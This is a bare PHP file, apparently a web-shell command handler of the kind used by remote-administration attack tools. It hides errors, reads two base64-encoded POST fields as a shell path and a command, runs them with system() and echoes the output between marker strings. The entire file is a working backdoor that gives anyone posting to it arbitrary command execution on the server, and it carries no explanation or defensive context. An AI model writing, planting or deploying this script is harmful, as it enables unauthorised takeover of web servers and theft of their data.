<?php 
@ini_set("display_errors","0");
@set_time_limit(0);
function_exists("set_magic_quotes_runtime") ? @set_magic_quotes_runtime(0) : "";
echo("->|");
;
$p=base64_decode($_POST["z1"]);
$s=base64_decode($_POST["z2"]);
$d=dirname($_SERVER["SCRIPT_FILENAME"]);
// $c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";
$r="{$p}  \"{$s}\"";
@system($r." 2>&1",$ret);
print ($ret!=0)?"\nret={$ret}\n":"";
;
echo("|<-");
die();

?>